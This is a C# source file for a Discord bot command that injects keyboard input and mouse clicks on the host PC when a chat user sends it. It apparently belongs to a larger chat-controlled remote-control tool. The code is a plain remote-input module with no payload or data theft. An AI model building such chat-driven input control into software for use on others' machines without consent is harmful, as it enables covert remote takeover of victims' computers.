using Discord;
using Discord.Commands;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class Input : CommandBase
    {
        [DllImport("user32.dll")]
        private static extern void mouse_event(
            uint dwFlags,
            uint dx,
            uint dy,
            uint dwData,
            UIntPtr dwExtraInfo
        );

        public override string Name => "input";
        public override string Info => "Simulates keyboard and mouse inputs";
        public override string Use => "Keys (@<num> for mouse buttons)";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length == 0)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string keys = string.Join(" ", args);

            if (keys.StartsWith("@") && keys.Length == 2)
            {
                switch (keys[1])
                {
                    case '1':
                        mouse_event(0x0002, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0004, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync($"Sent input for left click.");
                        return;

                    case '2':
                        mouse_event(0x0008, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0010, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync($"Sent input for right click.");
                        return;

                    case '3':
                        mouse_event(0x0020, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0040, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync($"Sent input for middle click.");
                        return;

                    default:
                        await socket.Message.ReplyAsync($"Invalid mouse button.");
                        return;
                }
            }

            SendKeys.SendWait(keys);
            await socket.Message.ReplyAsync($"Sent input for: {keys}");
        }
    }
}
